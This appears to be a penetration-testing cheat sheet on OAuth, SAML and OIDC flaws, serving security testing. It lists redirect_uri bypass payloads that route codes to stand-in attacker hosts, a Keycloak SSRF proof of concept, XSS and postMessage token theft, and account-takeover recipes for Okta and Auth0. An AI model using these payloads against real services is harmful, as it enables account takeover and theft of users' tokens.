# OAuth 2.0 / SSO Vulnerabilities

## Overview
OAuth 2.0 and Single Sign-On (SSO) implementation flaws that lead to account takeover, authentication bypass, and privilege escalation.

## OAuth Flow Overview
```
Authorization Code Flow:
1. Client → /authorize?client_id=X&redirect_uri=Y&state=Z&scope=S
2. User authenticates at provider
3. Provider → redirect_uri?code=ABC&state=Z
4. Client → /token (code=ABC, client_secret)
5. Provider returns access_token
```

## Redirect URI Attacks
```
# Open redirect in redirect_uri
redirect_uri=https://attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://attacker.com/target.com
redirect_uri=https://target.com.attacker.com

# Path traversal in redirect_uri
redirect_uri=https://target.com/callback/../evil

# Wildcard abuse (if allowed)
redirect_uri=https://sub.target.com  (if *.target.com allowed)

# URL fragment trick
redirect_uri=https://target.com/page#

# Localhost bypass
redirect_uri=http://localhost/callback

# Test with unregistered URIs — some providers don't validate strictly
```

## State Parameter Attacks (CSRF on OAuth)
```
# Missing state parameter → CSRF possible
# Predictable state → CSRF possible
# State not validated → CSRF possible

# Attack: craft link with attacker-controlled code, victim clicks
# → victim's account linked to attacker's OAuth account
https://target.com/auth/callback?code=ATTACKER_CODE&state=VICTIM_STATE
```

## Authorization Code Attacks
```
# Code reuse: try replaying authorization code
# Code leakage via Referer header
# Code in browser history/logs

# Steal code via redirect_uri open redirect:
/authorize?...&redirect_uri=https://attacker.com%2Fcallback%23

# PKCE bypass (if PKCE not enforced)
```

## Token Attacks
```
# Access token in URL (logged in server logs, Referer)
# Bearer token leak in JS files
# Token not expiring (test old tokens)
# Insufficient scope validation

# Token substitution: use token from app A in app B
# If same OAuth provider with multiple clients

# JWT access tokens: test algorithm confusion, weak signing
```

## SSO-Specific Attacks

### SAML Attacks
```
# XML signature wrapping (XSW)
# Inject unsigned assertion alongside signed one
# Comment injection in NameID: admin<!---->@target.com
# XML external entity in SAML response

# SAML response replay
# Missing InResponseTo validation → replay old responses

# Recipient validation bypass
# NotOnOrAfter not validated
```

### OpenID Connect
```
# nonce not validated → replay attacks
# ID token not validated (signature, iss, aud)
# Implicit flow token leakage via fragment

# Email as identifier: register attacker@target.com with victim email
# If provider trusts email without verification
```

## Account Linking Attacks
```
# Link attacker account to victim via CSRF on linking endpoint
# Pre-account takeover: register with victim email before they sign up
# OAuth account merge without verification

# Test: can you link an OAuth account to existing account without re-auth?
# Test: can another user's OAuth account be linked via CSRF?
```

## Scope Escalation
```
# Request more scopes than originally granted
# scope=read → scope=read+write+admin
# Increment scope in subsequent requests
# Check if scope is validated on token use vs token issuance
```

## Provider Misconfiguration
```
# Check /.well-known/openid-configuration for endpoints
# Check supported grant types (implicit flow = dangerous)
# Dynamic client registration open to public
# Missing PKCE requirement for public clients
```

## Testing Methodology
1. Map OAuth/SSO flow completely
2. Test redirect_uri validation (try variations)
3. Check state parameter presence and validation
4. Test authorization code reuse
5. Inspect tokens (JWT decode, scope, expiry)
6. Test CSRF on account linking
7. Try account pre-takeover
8. Check for token leakage in logs/headers/JS
9. Test SAML if used (XSW, replay)

## Tools
- Burp Suite OAuth Scanner
- `jwt_tool` for JWT analysis
- SAML Raider (Burp extension)
- Manual proxy inspection


## Additional Techniques — ported from WebSkills (oauth-misconfigurations-testing)

Most OAuth ATOs come from redirect_uri validation gaps, missing/static state, cross-app token reuse, and custom SSO trusting unverified emails. The overview above is the baseline; these are the specific request-level moves.

### Identity / scope tampering (steal or elevate the account)
- **`hd=` tampering** — on "Connect with Google", change `hd=company.com` → `hd=gmail.com` to link a personal email where a corporate one is expected.
- **Remove `email` from `scope`** — drop `email` from the scope on signup/login; some providers then let you set/link any email → ATO.
- **Inject `admin@company.com` in the scope/callback body** — `...&email=admin@company.com&access_token=***` to inherit an admin identity.
- **IDOR via `id=`** — change the `id` param in the connect/callback POST to another account's id.
- **Cross-app access-token reuse (Facebook/Google login):** create your own app with the same provider, generate a token, and swap it into the target's `auth_token`/`access_token` at login. If the target doesn't verify the token was issued *for its* client → ATO. Same root cause as **nOAuth** and the Salt "Oh-Auth" token-reuse class.
- **OAuth account without email** — register at the provider with a phone number only, use it to register on target, then add the victim's email in settings.

### Token / code leak channels
- **`.json` / `.xml` extension** — request `/oauth/Connect.json`; the token may be reflected in the response body.
- **`response_mode` tricks** — flip `query`→`fragment` (code lands after `#`, leaks via Referer) or `form_post` (auto-POST form whose `code`/`state` an XSS on the auth server can read).
- **Referer / browser-history leakage** — check whether `code`+`state` survive in the `Referer` when the user navigates onward.
- **postMessage theft** — a whitelisted subdomain that does `postMessage(location.href.split("#")[1], "*")` with no `X-Frame-Options` lets an iframe steal the token.

### redirect_uri validation bypass (whitelist evasion)
Beyond the basics, run the full pattern list against the `redirect_uri`:
```
https://me.com\@company.com          https://company.com\@me.com
https://me.com/.company.com          me.com%ff@company.com%2F
me.com%252f@company.com%2F           //me.com%0a%2523.company.com
me.com://company.com                 company.com.evil.com
evil.com#company.com                 evil.com?company.com
/%09/me.com     me.com%09company.com     /\me.com
company.com%252f@me.com%2fpath%2f%3   //me.com:%252525252f@company.com
```
Also try **IDN homograph** (`www.cṍmpany.com`), **black/invisible chars** (`%00`–`%FF`, e.g. `me.com%5bcompany.com`), **path traversal → open redirect** (`.../..%2f..%2fredirect_uri=https://me.com`), and **XSS/SSTI in `redirect_uri`/`scope`/`code`** (`data:` URI, `${T(java.lang.Runtime)...}`, reflected `code=,%2520alert(123))%253B//`).

### CSRF / forced linking
- **Missing or static `state`** → login CSRF and **forced profile linking**: capture the connect URL (with `redirect_uri`), drop it, send it to the victim (or iframe it); their browser completes the flow and links *your* social profile to *their* account.
- **`prompt=none`** minimises interaction for silent token reuse / automation.
- **Change request method** (GET/POST/HEAD/PUT) on the connect endpoint to find inconsistent routing/validation.

### Secrets & race
- **`client_secret` disclosure / brute-force at `/token`** — fuzz the `client_secret` param on the code-exchange request; a hit lets you mint tokens for any user.
- **Race conditions** on the callback / code-exchange (Turbo Intruder) — codes accepted more than once, or OTP checks bypassed.

### Custom SSO org-switch ATO (Okta / Auth0 — no email verification)
- **Okta org-switch:** victim ∈ VictimOrg on target.com. Attacker creates AttackerOrg, invites victim's email, wires their **own** Okta with a user `victim@gmail.com` (no verification), logs into target.com as the victim, then **switches org** to VictimOrg → accesses victim data.
- **Auth0 0/1-click account linking:** victim signs up via "Log in with Google"; attacker registers the *same email* with a password → if pre-linked, logged in (0-click), or logs in after victim clicks the confirm link (1-click).
- **Auth0 self-registration on login-only targets:** intercept the login request, change endpoint `/co/authenticate` → `/dbconnections/signup`, send `email`/`password`/`connection`; a `200` with `"email_verified":false` means you just created an account on a "login-only" app.
- **Auth0 Unicode email-normalization ATO:** register `victim@domain.com`, then register the dotless-i variant `vıctim@domain.com`; if the Get-User script doesn't normalize, both map to one user and you overwrite the credential.


## Additional Techniques — ported from WebSkills (writeup-techniques/oauth-oidc)

These are corpus-derived techniques (with CVE/report precedent) not covered by the redirect_uri/state/token-reuse baseline above or by `oidc_attacks.md`. Each is a distinct request-level move.

### `state` interception via query-param injection (TeamCity CVE-2022-24342)
Different root cause than "missing/static state": here `state` *is* present and validated, but the attacker injects query params during the flow to redirect the user into an **arbitrary** provider OAuth app they control, intercept a valid `state`, and connect their own social account to the victim's target account.
> "TeamCity was vulnerable to query parameter injection during OAuth2 flow, allowing an attacker to redirect user into an arbitrary GitHub OAuth2 application, intercept a valid state parameter, and connect arbitrary GitHub account to victim's TeamCity account."

Attacker hosts a GitHub OAuth app + exploit page:
```
authorization callback url: "http://{exploit-host}:8000/callback"
http://{exploit-host}:8000/exploit?target_host=http://{target-host}&gh_client_id={github_oauth_client_id}
```

### `request_uri` blind SSRF (Keycloak CVE-2020-10770)
Distinct from OIDC discovery-document SSRF: the OIDC `request_uri` parameter on the authorize endpoint is fetched server-side, unauthenticated. Put an OAST host in it and watch for the callback. Verbatim PoC:
```
GET /auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{hook}
```
Related precedent: GitLab "Unauthenticated blind SSRF in OAuth Jira authorization controller" ($4000).

### Base64-encoded callback params leak PII / are forgeable
Opaque-looking callback values (`state`, tokens, metadata blobs) are often just Base64 JSON that implementations assume is hidden. Always decode them.
> "Always decode opaque-looking values. Many implementations Base64-encode JSON or user metadata and assume that is 'hidden'. Base64 is reversible" — callback URLs leak email, tenant IDs, return paths, internal workflow state.

Decode `state`/opaque tokens for PII and to forge a matching value.

### Callback error-page XSS / HTML-injection (trusted-origin phishing) + WAF bypass
The first-party callback frequently reflects login failures using attacker-controlled `error`, `error_description`, `state`, `code` into HTML without encoding → XSS / credential-harvest phishing on a trusted origin. When common handlers are blacklisted, swap them for uncommon browser-specific event handlers (e.g. a Safari-only handler) to fire on the reflected callback page. Confirm by injecting `error_description=<mark>` / `state=<mark>` and looking for unencoded reflection.

### Forced OAuth authorization — no explicit consent click (LinkedIn)
The consent/approve button is auto-triggered without a deliberate click, so a framed/scripted page completes the grant.
> LinkedIn "Forced OAuth authorization using button ID in hash and holding space" — the approve button is a hash-targeted element auto-activated via a held keypress (spacebar), so a framed page approves the grant.

### OAuth remember-me / cookie forge → auth bypass (Grafana 2.0–5.2.2)
An OAuth/LDAP seeding flaw lets an attacker forge a valid remember-me cookie for any known username — full auth bypass independent of the OAuth flow itself.
> "Through improper seeding while userdata are requested from LDAP or OAuth it's possible to craft a valid remember-me cookie … bypass authentication for everyone knowing a valid username." (Metasploit `grafana_auth_bypass`)

### `redirect_uri` percent / malformed-host confusion (Spring `DefaultRedirectResolver`, CVE-2019-3778)
A specific bypass beyond the fork's pattern list: insert a stray leading `%` so the AS URI parser mis-validates but the browser still routes to the attacker host — no OAuth error, `code` delivered to attacker.
```
redirect_uri=http://%localhost:9000/login/oauth2/code/     # vs legit http://localhost:8086/login/oauth2/code/
```
Result — `302 Location: http://localhost:8086/login/oauth2/code/?code=4ecsea&state=...` to the attacker-controlled authority.

### Whitelisted-host open-redirect chaining, incl. Basecamp CVE-2025-57821
Even a fully-locked `redirect_uri` whitelist fails if a whitelisted client app itself hosts an open redirector that forwards the `code`. New precedent worth noting:
> Basecamp `omniauth-rails_csrf_protection`/OAuth gem CVE-2025-57821: "A malformed URL bypasses the same-origin check on the `origin`/return parameter and redirects off-site **while preserving Rails flash/session cookies**."

### Implicit/hybrid token theft via attacker-controlled subpath on a trusted domain (HackTricks FXAuth)
Distinct from the "tokens-in-URL leak via Referer" note in `oidc_attacks.md`: point `redirect_uri`/`next` at an **attacker-controlled namespace on the allowlisted domain**, then have JS on that trusted subpath read `location.hash` and exfiltrate — the domain is "trusted" so validation passes.
> "JavaScript on that page reads location.hash and exfiltrates the values despite the domain being 'trusted.'" Then replay captured values against downstream privileged endpoints.

### postMessage origin-check bypass via regex-dot / substring (weak validation)
Beyond the basic `postMessage(..., "*")` theft: when the receiver validates origin with `.match()`, `indexOf()`, `endsWith()`, or `startsWith()`, craft a domain that satisfies the check.
> `.match()` "is intended for regular expressions … a dot (.) acts as a wildcard, allowing bypassing with specially crafted domains" — e.g. `legitXcom.attacker.com`, `legit.com.attacker.com`.
